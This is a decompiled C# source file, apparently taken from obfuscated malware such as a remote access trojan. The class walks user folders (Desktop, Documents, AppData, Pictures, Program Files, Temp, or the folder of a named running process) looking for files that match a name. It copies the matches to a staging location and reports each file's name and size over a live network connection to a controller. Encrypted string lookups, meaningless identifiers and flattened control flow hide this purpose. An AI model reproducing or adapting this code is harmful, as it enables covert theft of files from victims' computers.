using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

public class _____________________
{
	public string _;

	public string __;

	public unsafe void _()
	{
		try
		{
			string value = _003CModule_003E.____<string>(3988250913u);
			int num = default(int);
			nint num2;
			if (this.__.Contains(_003CModule_003E.___<string>(4082611426u)))
			{
				num = -28106;
				if ((nint)Type.EmptyTypes.LongLength + -2882 == -2882)
				{
					value = this.__.Replace(_003CModule_003E.______<string>(1838639162u), string.Empty);
					num2 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_034b;
				}
			}
			goto IL_0379;
			IL_03cd:
			this._ = Environment.GetEnvironmentVariable(_003CModule_003E.____<string>(2121464145u)) + _003CModule_003E.______<string>(824110388u);
			if (((3134 + 84224 * num) & 0x38) != 56 || num != 26996)
			{
				goto IL_0411;
			}
			goto IL_041c;
			IL_0273:
			this._ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.___<string>(3619323560u);
			int num3 = default(int);
			int num4 = default(int);
			if ((num3 << 22) - 6662 == 7943 || (((uint)num4 / 800795433u) ^ 0xD1E) == 2281258130u)
			{
				goto IL_0244;
			}
			if (((57 + ((uint)num >> 27)) | 0xFFFFE9FFu) == 4294961663u)
			{
				goto IL_041c;
			}
			num2 = (nint)Type.EmptyTypes.LongLength + -1443974987;
			goto IL_034b;
			IL_0379:
			string text = this._;
			if (Operators.CompareString(text, _003CModule_003E.____<string>(2758943525u), false) != 0)
			{
				if (Operators.CompareString(text, _003CModule_003E.______<string>(3465041506u), false) == 0)
				{
					num = (int)((nint)Type.EmptyTypes.LongLength + 15922);
					num2 = (nint)Type.EmptyTypes.LongLength + 0;
				}
				else if (Operators.CompareString(text, _003CModule_003E.____<string>(1848375827u), false) == 0)
				{
					num2 = (nint)Type.EmptyTypes.LongLength + 8;
				}
				else if (Operators.CompareString(text, _003CModule_003E._____<string>(1431010491u), false) == 0)
				{
					num2 = (nint)Type.EmptyTypes.LongLength + 4;
				}
				else
				{
					int num5 = default(int);
					if (Operators.CompareString(text, _003CModule_003E._______<string>(2257419138u), false) != 0)
					{
						if (Operators.CompareString(text, _003CModule_003E._______<string>(3372240373u), false) == 0)
						{
							num = 6259;
							if ((nint)Type.EmptyTypes.LongLength + 12329 == 12329)
							{
								this._ = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + _003CModule_003E._____<string>(305124521u);
								if ((~((uint)num5 / 24460871u) & 0x8000D97u) != 0 && num == 16707)
								{
									goto IL_02e0;
								}
							}
						}
						else
						{
							if (Operators.CompareString(text, _003CModule_003E._____<string>(4243870425u), false) == 0)
							{
								num = -2850;
								if ((((0x163Du ^ (uint)num5) != 0 || ((uint)(3472 + num5) & 0x7EC40F24u) != 0) ? (-25144) : (((0x3208 ^ ((uint)num3 % 3u + ((uint)num3 >> 28))) == 0) ? (sizeof(long) + 1077614949) : (-413368447))) == 14045)
								{
									goto IL_0273;
								}
								goto IL_0327;
							}
							if (Operators.CompareString(text, _003CModule_003E.___<string>(352640885u), false) == 0)
							{
								num = 22870;
								if (sizeof(short) + -15493 == -15942)
								{
									goto IL_0244;
								}
								this._ = Environment.GetEnvironmentVariable(_003CModule_003E.____<string>(1704223106u)) + _003CModule_003E._____<string>(305124521u);
							}
						}
						goto IL_041c;
					}
					num = 10362;
					num5 = -28051;
					this._ = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + _003CModule_003E._______<string>(3427012921u);
					num2 = sizeof(long) + -1;
				}
				goto IL_034b;
			}
			num = (int)((nint)Type.EmptyTypes.LongLength + 26996);
			goto IL_03cd;
			IL_02e0:
			this._ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + _003CModule_003E._____<string>(305124521u);
			if ((0xFFFFEFFFu | (9486 + (uint)num3 % 106u)) == 4294963199u && num == -261)
			{
				goto IL_0327;
			}
			goto IL_041c;
			IL_0327:
			this._ = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + _003CModule_003E.___<string>(3619323560u);
			num2 = (nint)Type.EmptyTypes.LongLength + 1;
			goto IL_034b;
			IL_041c:
			if (this._.Contains(_003CModule_003E._______<string>(411184504u)))
			{
				this._ = __(this._.Replace(_003CModule_003E.______<string>(4118365827u), string.Empty));
				string text2 = this._;
				num4 = 48170;
				if (Operators.CompareString(text2, _003CModule_003E.__________(47111, num4, (num4 * -536870912 == 7211) ? (sizeof(ulong) + 1505125774) : 30), false) == 0)
				{
					return;
				}
			}
			string text3 = default(string);
			string[] array = default(string[]);
			FileInfo fileInfo = default(FileInfo);
			foreach (string item in ___(this._))
			{
				try
				{
					int num6;
					if ((Operators.CompareString(Path.GetFileName(item)!.ToLower(), this.__, false) == 0) | Path.GetFileName(item)!.ToLower().Contains(value))
					{
						num6 = 5025;
						if (sizeof(long) + 14847 != -16267)
						{
							goto IL_0544;
						}
						goto IL_0668;
					}
					goto end_IL_04c4;
					IL_0544:
					string ____ = ______________________._____;
					string? fileName = Path.GetFileName(item);
					___________._ = -1748580011;
					text3 = ____ + fileName;
					if (16354 * num - 4443 != (int)((uint)(num * 218 + 954255650 + num * 38) >> 3))
					{
						goto IL_05e6;
					}
					nint num7 = sizeof(Guid) + 1409053826;
					goto IL_0631;
					IL_0668:
					array[4] = _003CModule_003E._______<string>(2889302272u);
					array[5] = text3;
					num7 = (nint)Type.EmptyTypes.LongLength + 3;
					goto IL_0631;
					IL_0631:
					switch (num7)
					{
					case 2:
						break;
					default:
						goto IL_05e6;
					case 1:
						goto IL_0602;
					case 3:
					{
						array[6] = _003CModule_003E.____<string>(3008796200u);
						array[7] = fileInfo.Length.ToString();
						array[8] = _003CModule_003E._____<string>(561647944u);
						string string_ = string.Concat(array);
						______________________________________________________________.___________(string_);
						Thread.Sleep(2000);
						goto end_IL_04c4;
					}
					}
					array[0] = _003CModule_003E.____<string>(3736758410u);
					array[1] = ______________________________________________________________.________________________;
					int num8 = num6;
					num6 = -598;
					if (num8 == -17647)
					{
						goto IL_0544;
					}
					do
					{
						array[2] = _003CModule_003E.___<string>(2677394803u);
						array[3] = Path.GetFileName(text3);
					}
					while (num6 == -8949);
					goto IL_0668;
					IL_0602:
					fileInfo = new FileInfo(text3);
					if (______________________________________________________________.__.Connected)
					{
						array = new string[9];
						num6 = 32756;
						num7 = (nint)Type.EmptyTypes.LongLength + 2;
						goto IL_0631;
					}
					goto end_IL_04c4;
					IL_05f4:
					num7 = (nint)Type.EmptyTypes.LongLength + -2000709831;
					goto IL_0631;
					IL_05e6:
					while (!File.Exists(text3))
					{
						((ServerComputer)_____________._).get_FileSystem().CopyFile(item, text3);
						if (((((uint)(num3 << 19) >> 19) ^ (uint)(num3 - 2)) & (true ? 1u : 0u)) != 0)
						{
							goto IL_05f4;
						}
						int _______________ = _003CModule_003E.________________;
						if (((_______________ << 16) ^ 0x1A40) - 576863472 == (int)((uint)num4 % 29037696u >> 25))
						{
							continue;
						}
						goto IL_0602;
					}
					end_IL_04c4:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			return;
			IL_0244:
			this.__ = this.__.Replace(_003CModule_003E._______<string>(1033052807u), string.Empty);
			num2 = 5;
			goto IL_034b;
			IL_0411:
			this._ = Path.GetTempPath();
			goto IL_041c;
			IL_034b:
			switch (num2)
			{
			case 8:
				goto IL_0273;
			case 0:
				goto IL_02e0;
			case 5:
				goto IL_0379;
			case 3:
				goto IL_03cd;
			case 4:
				goto IL_0411;
			case 1:
			case 6:
			case 7:
				goto IL_041c;
			}
			goto IL_0244;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe string __(string string_0)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(string_0);
			if (processesByName.Length > 0)
			{
				return Path.GetDirectoryName(processesByName[0].MainModule!.FileName);
			}
			return _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 8178), sizeof(long) + 9252, sizeof(byte) + 217);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			nint num = (nint)Type.EmptyTypes.LongLength + 18796;
			int ______________ = _003CModule_003E._______________;
			string result = _003CModule_003E.__________((int)num, 19531, (int)((((6 * ______________ + ______________ * 122) ^ 0x74A) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1989769347) : (sizeof(float) + 151)));
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private List<string> ___(string string_0)
	{
		List<string> list = new List<string>();
		try
		{
			string[] files = Directory.GetFiles(string_0);
			foreach (string item in files)
			{
				try
				{
					list.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			foreach (string string_ in directories)
			{
				try
				{
					list.AddRange(___(string_));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			return list;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			return list;
		}
	}
}
